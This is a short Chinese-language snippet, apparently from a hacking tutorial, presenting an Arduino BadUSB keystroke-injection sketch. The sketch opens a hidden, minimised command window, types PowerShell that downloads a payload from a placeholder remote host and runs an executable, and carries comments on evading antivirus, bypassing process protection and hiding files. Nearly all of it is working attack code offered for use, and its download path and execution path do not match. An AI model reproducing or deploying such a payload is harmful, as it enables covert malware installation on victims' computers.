payload2这个payload是打开一个命令行窗口，然后让他最小化，让受害者不能第一时间看到代码，这样操作更容易绕过一些杀软，也有更多的操作空间
具体命令
#include &lt;Keyboard.h&gt;void setup() &#123;Keyboard.begin();//开始键盘通讯delay(300);//延时Keyboard.press(KEY_LEFT_GUI);//win 键delay(500);Keyboard.press(&#x27;r&#x27;);//r 键delay(500); Keyboard.release(KEY_LEFT_GUI); Keyboard.release(&#x27;r&#x27;);Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法Keyboard.release(KEY_CAPS_LOCK);delay(500);Keyboard.println(&quot;cmd /T:01 /K \&quot;@echo off &amp;&amp; mode con:COLS=15 LINES=1\&quot;&quot;);  //使用最小化隐藏cmd 窗口//cmd /c start /minCMD /C START /MIN POWERSHELL -W HIDDEN delay(500);Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); delay(200); Keyboard.println(&quot;powershell&quot;);delay(50);Keyboard.println(&quot;$clnt = new-object system.net.webclient;&quot;); delay(50); //短暂的延迟一下，太快会导致代码出错Keyboard.println(&quot;$url=&#x27;http://ip:port/payload&#x27;;&quot;); //ip，端口，payload，确保可以访问delay(50);Keyboard.println(&quot;$file = \&quot;E:\\payload\\test1\&quot;;&quot;); //下载到目标存放文件的地址，文件路径要\\delay(50);Keyboard.println(&quot;$clnt.downloadfile($url,$file);&quot;);  //用分段执行绕过进程防护Keyboard.println(&quot;c:\\windows\\temp\\hy.exe&quot;); //这里可以自行研究隐藏文件放到D盘，因为C盘可能没权限。思路：可使用attrib +h 1.txt 将文件隐藏Keyboard.println(&quot;exit&quot;);//退出当前powershell窗口delay(3000);//等待下载完成，Keyboard.println(&quot;exit&quot;); //退出cmd小窗口Keyboard.press(KEY_RETURN); Keyboard.release(KEY_RETURN); Keyboard.press(KEY_CAPS_LOCK); Keyboard.release(KEY_CAPS_LOCK); Keyboard.end();//结束键盘通讯&#125;void loop() &#123;// put your main code here, to run repeatedly:&#125;

